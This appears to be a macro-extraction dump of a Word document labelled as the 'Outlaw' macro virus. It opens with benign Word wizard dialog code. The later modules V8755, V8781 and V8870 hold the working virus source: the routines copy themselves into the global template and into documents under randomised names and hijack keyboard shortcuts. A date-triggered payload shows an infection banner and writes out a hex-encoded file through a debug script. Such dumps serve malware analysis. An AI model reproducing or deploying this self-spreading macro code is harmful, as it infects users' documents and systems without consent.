    xStorePref id$ + WordBasic.[LTrim$](Str(count_)), v$
    xStorePref id$ + "Lines", Str(count_)
End Sub

Private Sub RstDlgMultiLinePref(id$, defaultStr$)
Dim count_
Dim v$
Dim f$
    count_ = WordBasic.Val(xFetchPref$(id$ + "Lines"))
    If count_ = 0 Then
        v$ = defaultStr$
    Else
        v$ = xFetchPref$(id$ + WordBasic.[LTrim$](Str(count_)))
        If v$ = "~" Then v$ = ""
        count_ = count_ - 1
        While count_ > 0
            f$ = xFetchPref$(id$ + WordBasic.[LTrim$](Str(count_)))
            If f$ = "~" Then f$ = ""
            v$ = f$ + Chr(13) + v$
            count_ = count_ - 1
        Wend
    End If
    WordBasic.DlgText id$, v$
End Sub

'===

Private Sub ItemsInState(howMany)
    LastState = LastState + 1
    StateItems__(LastState) = howMany + StateItems__(LastState - 1)
End Sub

Private Sub EnableControls() 'Enable/Disable controls
    If State > 1 Then
        WordBasic.DlgEnable 5, 1 '<Back
    End If
    If State < LastState Then
        WordBasic.DlgEnable 6, 1 'Next>
    End If
    If State = 1 Then
        WordBasic.DlgFocus 6 'Next>
        WordBasic.DlgEnable 5, 0 '<Back
    ElseIf State = LastState Then
        WordBasic.DlgFocus 7 'finish
        WordBasic.DlgEnable 6, 0 'Next
    End If
End Sub 'EnableControls


Private Sub SHControls(FirstField, LimField, SH) 'Show/Hide controls
Dim iField
    For iField = FirstField To LimField - 1
        WordBasic.DlgVisible iField, SH
    Next
End Sub 'SHControls

Private Sub EnabFields(FirstField, LimField, ED) 'Enable/Disable controls
Dim iField
    For iField = FirstField To LimField - 1
        WordBasic.DlgEnable iField, ED
    Next
End Sub 'EnabFields

Private Sub ChangeState(sold, snew)
    SHControls (StateItems__(sold - 1)), (StateItems__(sold)), 0
    If HideFilePreview__(snew) - HideFilePreview__(sold) Then
        WordBasic.DlgVisible 8
    End If
    SHControls (StateItems__(snew - 1)), (StateItems__(snew)), 1
    State = snew
    If snew = 2 And WordBasic.DlgValue("LetterMethod") = 1 Then
        WordBasic.DlgVisible "chkloID", 0
        WordBasic.DlgVisible "chkloWriterInitials", 0
        WordBasic.DlgVisible "chkloTypistInitials", 0
        WordBasic.DlgVisible "chkloCC", 0
        WordBasic.DlgVisible "chkloEnclosures", 0
        WordBasic.DlgVisible "chkloAttachments", 0
    End If
    Rem Chk if MAPI environment is present to enable AddressBook buttons
    If snew = 5 Then
        WordBasic.DlgEnable 43, 0 - WordBasic.CommandValid(kInsertAddress$)
        WordBasic.DlgEnable 44, 0 - WordBasic.CommandValid(kInsertAddress$)
    End If
    EnableControls
End Sub 'ChangeState

'%%%% Wizard Dialog Control Function %%%
Private Function DlgControl(id$, iaction, wvalue)
Dim fRet
Dim idnum
Dim result
    fRet = 1
    Select Case iaction
        Case 1  'Init
            State = 1
            WordBasic.DlgVisible 2 'Hide OK button
            WordBasic.DlgVisible 3 'Hide Hint button (no hints)
            RstDialog   'restore dialog settings
            SHControls (StateItems__(0)), (StateItems__(LastState)), 0 'Hide ALL states
            SHControls (StateItems__(State - 1)), (StateItems__(State)), 1 'Show initial state
            If HideFilePreview__(State) <> 0 Then WordBasic.DlgVisible 8
            EnableControls 'Enable/Disable controls
            WordBasic.DlgFocus 6 'Next>
            fRet = 0
        Case 2  'Click
            idnum = WordBasic.DlgControlId(id$)
            result = DoButtonClick(id$, idnum)
            If result = 0 Then
                Select Case idnum
                Case 4 'Cancel
                    fRet = 0 'exit dialog
                Case 5 '<Back
                    ChangeState State, PrevState(State)
                Case 6 'Next>
                    ChangeState State, NextState(State)
                Case 43 'Address Book To DAPFEL
                    SetAddress (1)
                    WordBasic.DlgFocus 40
                Case 44 'Address Book Return DAPFEL
                    SetAddress (2)
                    WordBasic.DlgFocus 42
                Case Else
                    'not gunna happen
                End Select
            ElseIf result = 1 Then
                SaveDialog 'save settings
                fRet = 0
            End If
        Case 3 'Item contents changed
            ' do nothing
        Case 4 'item focus changed
            ItemFocusChanged id$, wvalue
        Case 5 'idle
            WordBasic.PrintStatusBar "" 'clear status bar
            If WordBasic.Window() = iEmptyDoc Then WordBasic.WindowList (iWorkDoc) 'bring work to front
        Case 6 'updated forced (by moving dialog)
            WordBasic.WindowList (iEmptyDoc)    'bring the empty window to the fore
        Case Else
    End Select
    DlgControl = fRet
End Function 'DlgControl

Private Function StrWizardPath() As String
    Dim strPath As String
    Dim strFileName As String
    Dim i As Integer
    Dim fFound As Boolean

    On Error GoTo FatalError
    
    fFound = True
    strPath = objWizTemplate.path

    If (Len(strPath) = 0) Then
        ' New template based on Wizard
        ' Get location of templates - first look in UserTemplatesPath
        ' and then in Workgroup path
        i = 0
        fFound = False
        strPath = Application.Options.DefaultFilePath(wdUserTemplatesPath)
        
        While ((i < 2) And fFound = False)
            If (Len(strPath) <> 0) Then
                ' First try to find wizard with long filename
                WordBasic.FileFind SearchPath:=strPath, Name:=kWizname$ & strWIZ, SubDir:=1, MatchCase:=0
                If WordBasic.CountFoundFiles() = 0 Then
                    ' Try to find wizard with short filename
                    WordBasic.FileFind SearchPath:=strPath, Name:=strWizShortName & strWIZ, SubDir:=1, MatchCase:=0
                    If WordBasic.CountFoundFiles() <> 0 Then fFound = True
                Else
                    fFound = True
                End If
            End If
        
            i = i + 1
            strPath = Application.Options.DefaultFilePath(wdWorkgroupTemplatesPath)
        Wend
        
        If (fFound) Then ' Wizard was found, so save path
            strFileName = WordBasic.[FoundFileName$](1)
            strPath = WordBasic.[FileNameInfo$](strFileName, 5)
        End If
    End If

    If (fFound) Then
        strPathSeparator = Application.PathSeparator
        If Right$(strPath, 1) <> strPathSeparator Then strPath = strPath & strPathSeparator
        StrWizardPath = strPath
        Exit Function
    End If

LWizardMissing:
    MsgBox strERR_WIZ_NOT_FOUND
    
FatalError:
    ReportError Err
End Function ' StrWizardPath


'main error reporting routine called for fatal errors in the wizard
'SHOULD NOT BE CALLED FOR POST-WIZARD ERRORS
Public Sub ReportError(ByVal ErrorCode As ErrObject)
    Dim lErrorCode As Long
    Dim strErrorMsg As String
    
    lErrorCode = ErrorCode.Number
    strErrorMsg = ErrorCode.Description
    
    'The next statement seems to reset the ErrorCode object,
    'even though it is a ByVal argument
    On Error Resume Next
    
    ResetWizardEnvironment (True)
    
    If fBalloonVisible Then objAssistantBalloon.Close
    If lErrorCode Then DisplayErrorMsg strErrorMsg
    If lAssistantId Then Assistant.EndWizard lAssistantId, False '2nd parameter is fSuccess
    
    If (Not (formWizard Is Nothing)) Then
        formWizard.Hide
        Unload formWizard
        Set formWizard = Nothing
    End If
    
    'ReportError is not called in post-wizard option errors.
    'So, always closing the doc.
    ActiveDocument.Close wdDoNotSaveChanges 'ActiveDocument assumed to be set
    
    'terminate the wizard
    End

End Sub ' ReportError

-------------------------------------------------------------------------------
VBA MACRO V8755.bas 
in file: Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669 - OLE stream: 'Macros/VBA/V8755'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim A$
On Error GoTo -1: On Error GoTo Done

A$ = WordBasic.[FileName$]()
If A$ = "" Then GoTo Finish

If CheckInstalled = 0 Then
    Routine
    Crypt
    PayloadMakro
    WordBasic.FileSaveAll 1, 1
Else
    GoTo Done
End If

Done:
A$ = WordBasic.[FileName$]()
If A$ = "" Then
    GoTo Finish
Else
    WordBasic.Insert " "
End If

Finish:
End Sub

Private Sub Crypt()
Dim One
Dim Two
Dim Num
Dim A$
Dim Beginn
Dim B$
Dim C$
Dim E$
Dim ZU$
Dim PG$
One = 7369
Two = 9291
Num = WordBasic.Int(Rnd() * (Two - One) + One)
A$ = Str(Num)
A$ = WordBasic.[LTrim$](A$)

Beginn = WordBasic.Hour(WordBasic.Now())
B$ = Str(Beginn)
B$ = WordBasic.[LTrim$](B$)

If B$ = "1" Then C$ = "A"
If B$ = "2" Then C$ = "B"
If B$ = "3" Then C$ = "C"
If B$ = "4" Then C$ = "D"
If B$ = "5" Then C$ = "E"
If B$ = "6" Then C$ = "F"
If B$ = "7" Then C$ = "G"
If B$ = "8" Then C$ = "H"
If B$ = "9" Then C$ = "I"
If B$ = "10" Then C$ = "J"
If B$ = "11" Then C$ = "K"
If B$ = "12" Then C$ = "L"
If B$ = "13" Then C$ = "M"
If B$ = "14" Then C$ = "N"
If B$ = "15" Then C$ = "O"
If B$ = "16" Then C$ = "P"
If B$ = "17" Then C$ = "Q"
If B$ = "18" Then C$ = "R"
If B$ = "19" Then C$ = "S"
If B$ = "20" Then C$ = "T"
If B$ = "21" Then C$ = "U"
If B$ = "22" Then C$ = "V"
If B$ = "23" Then C$ = "W"
If B$ = "00" Then C$ = "X"

E$ = C$ + A$
ZU$ = WordBasic.[GetDocumentVar$]("VirNameDoc")
PG$ = WordBasic.[WindowName$]() + ":" + ZU$
WordBasic.MacroCopy PG$, "Global:" + E$
WordBasic.SetProfileString "Intl", "Name2", E$
WordBasic.ToolsCustomizeKeyboard KeyCode:=69, Category:=2, Name:=E$, Add:=1, Context:=0
End Sub


Private Sub Routine()
Dim One
Dim Two
Dim Num
Dim A$
Dim Beginn
Dim B$
Dim C$
Dim D$
Dim UZ$
Dim GP$
One = 7369
Two = 9291
Num = WordBasic.Int(Rnd() * (Two - One) + One)
A$ = Str(Num)
A$ = WordBasic.[LTrim$](A$)

Beginn = WordBasic.Hour(WordBasic.Now())
B$ = Str(Beginn)
B$ = WordBasic.[LTrim$](B$)

If B$ = "1" Then C$ = "A"
If B$ = "2" Then C$ = "B"
If B$ = "3" Then C$ = "C"
If B$ = "4" Then C$ = "D"
If B$ = "5" Then C$ = "E"
If B$ = "6" Then C$ = "F"
If B$ = "7" Then C$ = "G"
If B$ = "8" Then C$ = "H"
If B$ = "9" Then C$ = "I"
If B$ = "10" Then C$ = "J"
If B$ = "11" Then C$ = "K"
If B$ = "12" Then C$ = "L"
If B$ = "13" Then C$ = "M"
If B$ = "14" Then C$ = "N"
If B$ = "15" Then C$ = "O"
If B$ = "16" Then C$ = "P"
If B$ = "17" Then C$ = "Q"
If B$ = "18" Then C$ = "R"
If B$ = "19" Then C$ = "S"
If B$ = "20" Then C$ = "T"
If B$ = "21" Then C$ = "U"
If B$ = "22" Then C$ = "V"
If B$ = "23" Then C$ = "W"
If B$ = "00" Then C$ = "X"

D$ = C$ + A$
UZ$ = WordBasic.[GetDocumentVar$]("VirName")
GP$ = WordBasic.[WindowName$]() + ":" + UZ$
WordBasic.MacroCopy GP$, "Global:" + D$
WordBasic.SetProfileString "Intl", "Name", D$
WordBasic.ToolsCustomizeKeyboard KeyCode:=32, Category:=2, Name:=D$, Add:=1, Context:=0
End Sub

Private Sub PayloadMakro()
Dim One
Dim Two
Dim Num
Dim A$
Dim Beginn
Dim B$
Dim C$
Dim K$
Dim ZUZ$
Dim GP$
One = 7369
Two = 9291
Num = WordBasic.Int(Rnd() * (Two - One) + One)
A$ = Str(Num)
A$ = WordBasic.[LTrim$](A$)

Beginn = WordBasic.Hour(WordBasic.Now())
B$ = Str(Beginn)
B$ = WordBasic.[LTrim$](B$)

If B$ = "1" Then C$ = "A"
If B$ = "2" Then C$ = "B"
If B$ = "3" Then C$ = "C"
If B$ = "4" Then C$ = "D"
If B$ = "5" Then C$ = "E"
If B$ = "6" Then C$ = "F"
If B$ = "7" Then C$ = "G"
If B$ = "8" Then C$ = "H"
If B$ = "9" Then C$ = "I"
If B$ = "10" Then C$ = "J"
If B$ = "11" Then C$ = "K"
If B$ = "12" Then C$ = "L"
If B$ = "13" Then C$ = "M"
If B$ = "14" Then C$ = "N"
If B$ = "15" Then C$ = "O"
If B$ = "16" Then C$ = "P"
If B$ = "17" Then C$ = "Q"
If B$ = "18" Then C$ = "R"
If B$ = "19" Then C$ = "S"
If B$ = "20" Then C$ = "T"
If B$ = "21" Then C$ = "U"
If B$ = "22" Then C$ = "V"
If B$ = "23" Then C$ = "W"
If B$ = "00" Then C$ = "X"

K$ = C$ + A$
ZUZ$ = WordBasic.[GetDocumentVar$]("VirNamePayload")
GP$ = WordBasic.[WindowName$]() + ":" + ZUZ$
WordBasic.MacroCopy GP$, "Global:" + K$
WordBasic.SetProfileString "Intl", "Name3", K$
End Sub

Private Function CheckInstalled()
Dim CC$
Dim i
CC$ = WordBasic.[GetProfileString$]("Intl", "Name")
    CheckInstalled = 0
    If WordBasic.CountMacros(0) > 0 Then
        For i = 1 To WordBasic.CountMacros(0)
            If WordBasic.[MacroName$](i, 0) = CC$ Then
                CheckInstalled = 1
            End If
        Next i
    End If
End Function
-------------------------------------------------------------------------------
VBA MACRO V8781.bas 
in file: Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669 - OLE stream: 'Macros/VBA/V8781'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim A$
Dim UZ$
Dim ZU$
Dim ZUZ$
Dim WordVer
Dim AL$
Dim AK$
On Error GoTo -1: On Error GoTo Finish

A$ = WordBasic.[FileName$]()
If A$ = "" Then GoTo Finish

UZ$ = WordBasic.[GetProfileString$]("Intl", "Name")
ZU$ = WordBasic.[GetProfileString$]("Intl", "Name2")
ZUZ$ = WordBasic.[GetProfileString$]("Intl", "Name3")

If CheckInstalledDoc = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.FileSaveAs Format:=1
    Routine
    Crypt
    PayloadMakro
    WordBasic.FileSaveAll 1, 0
End If

Finish:
A$ = WordBasic.[FileName$]()
If A$ = "" Then
    GoTo Finito
Else
    WordBasic.Insert "e"
End If
Finito:
If WordBasic.Month(WordBasic.Now()) = 1 And WordBasic.Day(WordBasic.Now()) = 20 Then
    GoTo Payload
Else
    GoTo NO
End If

Payload:
If (InStr(WordBasic.[AppInfo$](1), "Macintosh") > 0) Then GoTo NO
If (InStr(WordBasic.[AppInfo$](1), "Windows 3.") > 0) Then GoTo NO
If WordBasic.[Left$](WordBasic.[AppInfo$](2), 1) = "6" Then
    GoTo NO
Else
    GoTo YES
End If

YES:
WordVer = WordBasic.Val(WordBasic.[Left$](WordBasic.[AppInfo$](2), 1))
AL$ = Str(WordVer)
AL$ = WordBasic.[LTrim$](AL$)

If AL$ = "7" Then
    GoTo Payload_Start
Else
    GoTo NO
End If

Payload_Start:
AK$ = WordBasic.[GetProfileString$]("Intl", "Name3")
WordBasic.ToolsMacro Name:=AK$, Run:=1, Show:=0, Description:="", NewName:=""

NO:
End Sub

Private Sub Crypt()
Dim One
Dim Two
Dim Num
Dim A$
Dim Beginn
Dim B$
Dim C$
Dim E$
Dim ZU$
One = 7369
Two = 9291
Num = WordBasic.Int(Rnd() * (Two - One) + One)
A$ = Str(Num)
A$ = WordBasic.[LTrim$](A$)

Beginn = WordBasic.Hour(WordBasic.Now())
B$ = Str(Beginn)
B$ = WordBasic.[LTrim$](B$)

If B$ = "1" Then C$ = "A"
If B$ = "2" Then C$ = "B"
If B$ = "3" Then C$ = "C"
If B$ = "4" Then C$ = "D"
If B$ = "5" Then C$ = "E"
If B$ = "6" Then C$ = "F"
If B$ = "7" Then C$ = "G"
If B$ = "8" Then C$ = "H"
If B$ = "9" Then C$ = "I"
If B$ = "10" Then C$ = "J"
If B$ = "11" Then C$ = "K"
If B$ = "12" Then C$ = "L"
If B$ = "13" Then C$ = "M"
If B$ = "14" Then C$ = "N"
If B$ = "15" Then C$ = "O"
If B$ = "16" Then C$ = "P"
If B$ = "17" Then C$ = "Q"
If B$ = "18" Then C$ = "R"
If B$ = "19" Then C$ = "S"
If B$ = "20" Then C$ = "T"
If B$ = "21" Then C$ = "U"
If B$ = "22" Then C$ = "V"
If B$ = "23" Then C$ = "W"
If B$ = "00" Then C$ = "X"

E$ = C$ + A$
ZU$ = WordBasic.[GetProfileString$]("Intl", "Name2")
WordBasic.MacroCopy "Global:" + ZU$, WordBasic.[WindowName$]() + ":" + E$
WordBasic.SetDocumentVar "VirNameDoc", E$
WordBasic.ToolsCustomizeKeyboard KeyCode:=69, Category:=2, Name:=E$, Add:=1, Context:=1
End Sub


Private Sub Routine()
Dim One
Dim Two
Dim Num
Dim A$
Dim Beginn
Dim B$
Dim C$
Dim D$
Dim UZ$
One = 7369
Two = 9291
Num = WordBasic.Int(Rnd() * (Two - One) + One)
A$ = Str(Num)
A$ = WordBasic.[LTrim$](A$)

Beginn = WordBasic.Hour(WordBasic.Now())
B$ = Str(Beginn)
B$ = WordBasic.[LTrim$](B$)

If B$ = "1" Then C$ = "A"
If B$ = "2" Then C$ = "B"
If B$ = "3" Then C$ = "C"
If B$ = "4" Then C$ = "D"
If B$ = "5" Then C$ = "E"
If B$ = "6" Then C$ = "F"
If B$ = "7" Then C$ = "G"
If B$ = "8" Then C$ = "H"
If B$ = "9" Then C$ = "I"
If B$ = "10" Then C$ = "J"
If B$ = "11" Then C$ = "K"
If B$ = "12" Then C$ = "L"
If B$ = "13" Then C$ = "M"
If B$ = "14" Then C$ = "N"
If B$ = "15" Then C$ = "O"
If B$ = "16" Then C$ = "P"
If B$ = "17" Then C$ = "Q"
If B$ = "18" Then C$ = "R"
If B$ = "19" Then C$ = "S"
If B$ = "20" Then C$ = "T"
If B$ = "21" Then C$ = "U"
If B$ = "22" Then C$ = "V"
If B$ = "23" Then C$ = "W"
If B$ = "00" Then C$ = "X"

D$ = C$ + A$
UZ$ = WordBasic.[GetProfileString$]("Intl", "Name")
WordBasic.MacroCopy "Global:" + UZ$, WordBasic.[WindowName$]() + ":" + D$
WordBasic.SetDocumentVar "VirName", D$
WordBasic.ToolsCustomizeKeyboard KeyCode:=32, Category:=2, Name:=D$, Add:=1, Context:=1
End Sub

Private Sub PayloadMakro()
Dim One
Dim Two
Dim Num
Dim A$
Dim Beginn
Dim B$
Dim C$
Dim K$
Dim ZUZ$
One = 7369
Two = 9291
Num = WordBasic.Int(Rnd() * (Two - One) + One)
A$ = Str(Num)
A$ = WordBasic.[LTrim$](A$)

Beginn = WordBasic.Hour(WordBasic.Now())
B$ = Str(Beginn)
B$ = WordBasic.[LTrim$](B$)

If B$ = "1" Then C$ = "A"
If B$ = "2" Then C$ = "B"
If B$ = "3" Then C$ = "C"
If B$ = "4" Then C$ = "D"
If B$ = "5" Then C$ = "E"
If B$ = "6" Then C$ = "F"
If B$ = "7" Then C$ = "G"
If B$ = "8" Then C$ = "H"
If B$ = "9" Then C$ = "I"
If B$ = "10" Then C$ = "J"
If B$ = "11" Then C$ = "K"
If B$ = "12" Then C$ = "L"
If B$ = "13" Then C$ = "M"
If B$ = "14" Then C$ = "N"
If B$ = "15" Then C$ = "O"
If B$ = "16" Then C$ = "P"
If B$ = "17" Then C$ = "Q"
If B$ = "18" Then C$ = "R"
If B$ = "19" Then C$ = "S"
If B$ = "20" Then C$ = "T"
If B$ = "21" Then C$ = "U"
If B$ = "22" Then C$ = "V"
If B$ = "23" Then C$ = "W"
If B$ = "00" Then C$ = "X"

K$ = C$ + A$
ZUZ$ = WordBasic.[GetProfileString$]("Intl", "Name3")
WordBasic.MacroCopy "Global:" + ZUZ$, WordBasic.[WindowName$]() + ":" + K$
WordBasic.SetDocumentVar "VirNamePayload", K$
End Sub

Private Function CheckInstalledDoc()
Dim CC$
Dim i
On Error Resume Next
CC$ = WordBasic.[GetDocumentVar$]("VirNameDoc")
    CheckInstalledDoc = 0
    If WordBasic.CountMacros(1) > 0 Then
        For i = 1 To WordBasic.CountMacros(1)
            If WordBasic.[MacroName$](i, 1) = CC$ Then
                CheckInstalledDoc = 1
            End If
        Next i
    End If
End Function
-------------------------------------------------------------------------------
VBA MACRO V8870.bas 
in file: Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669 - OLE stream: 'Macros/VBA/V8870'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Declare Function GetWindowsDirectoryA Lib "Kernel32" (ByVal WinDir$, ByVal nSize As Long) As Long
Private Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal pszSoundName As String, ByVal uFlags As Long) As Long

Public Sub MAIN()
Dim NO$
Dim NJ$
Dim G$
Dim WinDir$
Dim n
Dim WindDir$
WindDir$ = Space(255)
    Install
    Insert
    NO$ = WordBasic.[GetProfileString$]("Intl", "Name")
    NJ$ = WordBasic.[MacroFileName$](NO$)
    G$ = WordBasic.[FileNameInfo$](NJ$, 5)
    WinDir$ = String(255, "X")
    n = GetWindowsDirectoryA(WindDir$, 255)
    n = sndPlaySound(G$ + "laugh.wav ", 0)
End Sub

Private Sub Insert()
WordBasic.ToggleFull
WordBasic.DocMaximize
WordBasic.InsertPara
WordBasic.Insert Chr(9) + Chr(9) + Chr(9) + Chr(9) + Chr(9)
WordBasic.Bold
WordBasic.FontSize 18
WordBasic.Insert "You are infected with"
WordBasic.InsertPara
WordBasic.InsertPara
WordBasic.InsertPara
WordBasic.FontSize 72
WordBasic.Insert Chr(9) + Chr(9) + Chr(9) + Chr(9) + "Outlaw"
WordBasic.InsertPara
WordBasic.InsertPara
WordBasic.FontSize 18
WordBasic.Insert Chr(9) + Chr(9) + Chr(9) + Chr(9) + "A virus from Nightmare Joker"
End Sub

Private Sub Install()
Dim NO$
Dim NJ$
Dim G$
Dim n
Dim Timer_
WordBasic.FileNew Template:="Normal.dot", NewTemplate:=1
NO$ = WordBasic.[GetProfileString$]("Intl", "Name")
NJ$ = WordBasic.[MacroFileName$](NO$)
G$ = WordBasic.[FileNameInfo$](NJ$, 5)
Open G$ + "laugh.scr" For Output As 1
Print #1, "N LAUGH.COM"
Print #1, "E 0100 52 49 46 46 32 0E 00 00 57 41 56 45 66 6D 74 20"
Print #1, "E 0110 32 00 00 00 22 00 01 00 40 1F 00 00 2B 04 00 00"
Print #1, "E 0120 20 00 01 00 20 00 01 00 F0 00 00 00 00 00 00 00"
Print #1, "E 0130 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0140 00 00 00 00 00 00 66 61 63 74 04 00 00 00 08 68"
Print #1, "E 0150 00 00 64 61 74 61 E0 0D 00 00 9B 59 2B 31 7F 2C"
Print #1, "E 0160 F4 2F 88 48 2E BF 42 88 88 71 C0 B0 DE 7E F9 67"
Print #1, "E 0170 82 49 58 A9 06 00 69 87 5C 19 41 E2 D2 75 FF FF"
Print #1, "E 0180 FF 0F 55 15 55 25 00 00 00 00 10 8B 08 0A B0 4B"
Print #1, "E 0190 B1 88 A0 37 B0 05 A0 37 00 44 99 D1 D1 4C FF CF"
Print #1, "E 01A0 0D 2C 00 80 BF B4 A8 06 92 7A 20 E1 23 58 29 D5"
Print #1, "E 01B0 A3 BD 1B A4 09 A9 3B C8 1D 50 95 5C D1 55 7F 62"
Print #1, "E 01C0 32 46 12 EA CE 57 2A 44 AA 19 0C 97 26 6F 8A D0"
Print #1, "E 01D0 98 A6 8D BB E9 79 DB 70 89 D1 9D 3C DB BC 1E 4F"
Print #1, "E 01E0 B0 45 DC 2A 28 C9 FB BE 0A 5D 9C 11 39 8D 3F AF"
Print #1, "E 01F0 F2 E6 7B 49 63 07 DD 24 B0 BA DF D3 E2 B8 A7 F0"
Print #1, "E 0200 EF 44 A7 BA 22 C5 77 2A 57 57 0C 9F E6 30 DD 9A"
Print #1, "E 0210 CC 82 3E F4 CC 81 DC 88 C2 B3 1F 44 DB 94 A9 2E"
Print #1, "E 0220 E6 46 22 5D EF 1F 17 1D 9B 52 BE D9 91 F9 DC AF"
Print #1, "E 0230 B9 83 AC 0D 2C 86 6F E9 04 93 D9 5C 4A 9A AD 40"
Print #1, "E 0240 32 59 20 D2 5E 0D 8C 66 C8 55 1D 91 43 3A 6D FF"
Print #1, "E 0250 E0 EB CC D5 D8 34 4C ED 0D 57 1F 64 59 D5 47 D1"
Print #1, "E 0260 FF 57 63 2A 0A 99 6E 6A 77 65 1E 58 AD 3A 6F 8C"
Print #1, "E 0270 62 25 EE 43 C8 47 5D 7E 71 66 9F 6B C2 99 C5 1A"
Print #1, "E 0280 30 4C F5 1A C0 DD 08 BD 36 40 7D 63 9E 63 9E 31"
Print #1, "E 0290 30 81 8D C1 70 AD BD A8 F0 9F 1B 64 CA B9 CC 12"
Print #1, "E 02A0 1B 48 88 7A 9F 92 3B 9F 28 45 BF B1 81 CB AE 8E"
Print #1, "E 02B0 DD A7 2C 75 65 27 5D 76 19 E3 DF EB C9 B9 23 D8"
Print #1, "E 02C0 89 41 FE E9 C1 96 20 67 35 40 9D 11 76 08 AD A3"
Print #1, "E 02D0 4C EE 1E E7 90 72 4E 96 46 8A DB EB E2 B9 5E 51"
Print #1, "E 02E0 92 48 C8 3D E2 52 75 A2 85 44 2D BB DB D1 CF D9"
Print #1, "E 02F0 29 FD BE A4 2E 81 EE 28 66 1B DD EB C2 BD 69 59"
Print #1, "E 0300 6C 45 C2 C6 F7 2B 86 3F 00 4F 9F 9D 08 8B FE 05"
Print #1, "E 0310 76 DC AD E3 5B 1B BE 93 78 40 61 6C 32 B9 AE 7F"
Print #1, "E 0320 CD 4C 27 48 6B B2 D1 F5 4D 6F 2F DA 51 4B 0F 42"
Print #1, "E 0330 B9 BA 5E B4 72 02 6E 73 70 4D DD E3 CA BD 47 A5"
Print #1, "E 0340 13 56 E9 BF C6 10 55 97 CA 55 DF E7 79 7B AF 8A"
Print #1, "E 0350 C4 64 3F 99 24 A2 8F 9F 6D 3C DB 5B D3 79 30 D2"
Print #1, "E 0360 7B 3C 7D 7D 75 BD 5D 2A E0 7E 4F 18 A9 E9 4F F7"
Print #1, "E 0370 BC FD 4F 03 86 1D 5F E4 6C 66 E3 52 A9 75 D9 BB"
Print #1, "E 0380 52 7B FA DF DF B7 A9 0D C9 78 2F 5B A2 F7 3F 8E"
Print #1, "E 0390 82 A0 BF 8B 36 47 6F B2 ED B1 67 E2 39 91 B5 13"
Print #1, "E 03A0 AA 4B F5 D5 2F A4 44 8D E7 5F 7E 62 BE 1E DF 89"
Print #1, "E 03B0 C6 44 4F 23 A9 25 5F B6 11 68 A1 DA B9 78 2B 22"
Print #1, "E 03C0 2A 66 E9 7D 5D 35 86 9F 61 75 AF 68 75 26 9E D9"
Print #1, "E 03D0 DB C0 6F E4 E2 D7 AE 47 F9 20 9F 62 4A 55 8F E0"
Print #1, "E 03E0 5F 0B 9B 7D 57 47 DF CE 57 35 7E ED E1 96 4D 71"
Print #1, "E 03F0 43 56 CD 6F 68 A2 7C 24 80 78 61 E4 32 B5 12 54"
Print #1, "E 0400 0B 63 33 7D 6C C7 C7 06 C0 5F BC 29 6E BE AD 6A"
Print #1, "E 0410 C0 17 DD 5F EC B3 5D F7 F2 41 21 64 BA AD 76 3E"
Print #1, "E 0420 51 70 F9 05 CA 1F 77 C1 19 39 BD 87 D2 89 2E 50"
Print #1, "E 0430 1D B4 0C A2 0C 75 0D 49 89 E7 DD E3 C9 99 CE 4E"
Print #1, "E 0440 0F 76 82 2E ED 13 4B B5 50 6F 5E 92 36 01 4D F1"
Print #1, "E 0450 02 B6 9C 29 10 63 AD AF 03 35 9B EB 4A 7A 4E 87"
Print #1, "E 0460 16 39 24 C8 FD 77 08 87 2E 65 BE BD F3 29 9C D9"
Print #1, "E 0470 94 58 3D D2 B5 5A 0D 62 BD DE DB 73 5A 7A 2B 22"
Print #1, "E 0480 3F 08 53 FD 57 A3 29 AA 7E 4F 0C 7A 08 A8 5D 87"
Print #1, "E 0490 78 17 BD 2D 1A 85 FC FE A3 03 5D E3 49 95 FB 6C"
Print #1, "E 04A0 2C 79 96 6E AE 52 2E 10 01 3A 1D 86 F3 A7 8D 43"
Print #1, "E 04B0 88 AB FD 7B 45 18 2D E2 1D C8 DF 5B C2 75 C5 12"
Print #1, "E 04C0 6C 45 1A 5B E3 5B B5 68 05 4F DC 69 8A 40 9D 87"
Print #1, "E 04D0 CB F8 DD 8B 3E 0A AC AE 5D 12 DF 6B 49 B5 44 4C"
Print #1, "E 04E0 53 4E 3D 02 A6 B8 72 AF F5 7E 4D A1 C1 2B 5E 1A"
Print #1, "E 04F0 86 F4 9D D7 AB D8 EC E3 A5 59 9D 43 42 6D C4 FF"
Print #1, "E 0500 DF 05 69 8D A7 CD AF 49 55 05 3C 3C 23 9C 9C 87"
Print #1, "E 0510 B8 17 3E 20 FA 5E BF 4C 7E EA 23 D3 D9 54 AE D6"
Print #1, "E 0520 A8 15 5F DF 7F 4D D7 55 FF 1F CF 61 41 02 8F E7"
Print #1, "E 0530 35 0E 1F 6C 1B 99 7F E6 A5 05 21 DB 53 B5 43 E4"
Print #1, "E 0540 A9 18 D7 F7 D7 5D DD DF 5D 1D DF 34 76 27 8F BC"
Print #1, "E 0550 00 01 8F CF 02 E6 0F 26 23 23 A1 E2 52 95 A9 16"
Print #1, "E 0560 03 18 D5 5D FD 77 FF DF 5D 15 EF 34 A2 03 0F E8"
Print #1, "E 0570 75 D6 8F 0F 4A B9 DF 81 99 35 E3 5A 4A 75 8B D6"
Print #1, "E 0580 30 1C F7 DF D7 9D 75 DF 7D 15 BF F2 B5 83 BF 68"
Print #1, "E 0590 F2 29 3F FF 30 01 6F 66 EA DA 9D CA 39 51 AA 58"
Print #1, "E 05A0 F2 15 5D D5 5D FD FF 55 7F 15 9F 76 2D 12 EF 3A"
Print #1, "E 05B0 68 7D DF 0A 0B B4 8F EB F8 AF 17 52 C1 6C 91 77"
Print #1, "E 05C0 52 29 55 5D DF 4F F5 5D DD 2F 3F 2B 8E 88 8F 35"
Print #1, "E 05D0 D4 3F FF E1 F3 27 EF A2 06 2A DF 5A C9 50 B5 D8"
Print #1, "E 05E0 63 35 F3 DD 4C 87 F7 D1 59 37 DF 64 79 A4 CF 95"
